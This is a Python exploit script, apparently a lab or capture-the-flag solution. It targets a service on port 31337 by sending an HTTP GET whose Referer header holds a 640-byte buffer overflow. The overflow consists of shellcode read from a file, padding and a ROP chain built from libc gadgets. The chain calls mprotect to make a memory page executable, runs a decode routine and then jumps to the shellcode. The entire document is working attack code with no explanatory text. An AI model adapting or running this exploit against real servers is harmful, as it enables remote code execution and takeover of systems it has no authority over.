#!/usr/bin/python3

from socket import *
import struct
import sys
import urllib.request, urllib.parse, urllib.error

addr = '127.0.0.1'
if len(sys.argv) > 1:
    addr = sys.argv[1]
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))

exploit = ""
with open("exploit64", "rb") as fh:
    exploit = fh.read()
#exploit is 150 bytes

offset = 0x00007ffff7dc8000	    # address of libc. run, b main, info proc mappings
mprotect_addr = 0xf6210 + offset
pop_rdi_addr = 0x0238f2 + offset # libc gadgets found with ROPGadget
pop_rsi_addr = 0x023e19 + offset
pop_rdx_addr = 0x1089b6 + offset
decode_addr = 0x0401dd6
shell_addr = 0x41414020
shell_page = 0x41414000
size_arg = 0x1000		    # size to make executable
prot_arg = 0x7		    # value of PROT_READ | PROT_WRITE | PROT_EXEC

msg = b'GET /asdf.vbs HTTP/1.1\r\n'
msg += b'Referer:'

x = exploit
x += b'A' * 490		    #fill up the rest of the 640 byte buffer
x += b'\xFF'* 8		    #EBP

x += struct.pack("<Q", pop_rdi_addr)    #loading args for mprotect
x += struct.pack("<Q", shell_page)

x += struct.pack("<Q", pop_rsi_addr)
x += struct.pack("<Q", size_arg)

x += struct.pack("<Q", pop_rdx_addr)
x += struct.pack("<Q", prot_arg)

x += struct.pack("<Q", mprotect_addr)   #mprotect addr

x += struct.pack("<Q", pop_rdi_addr)    #loading args for decode
x += struct.pack("<Q", shell_addr)

x += struct.pack("<Q", decode_addr)

x += struct.pack("<Q", shell_addr)	    #return addr from mprotect (run shellcode)

msg += urllib.parse.quote(x).encode()

msg += b'\r\n\r\n'

s.send(msg)
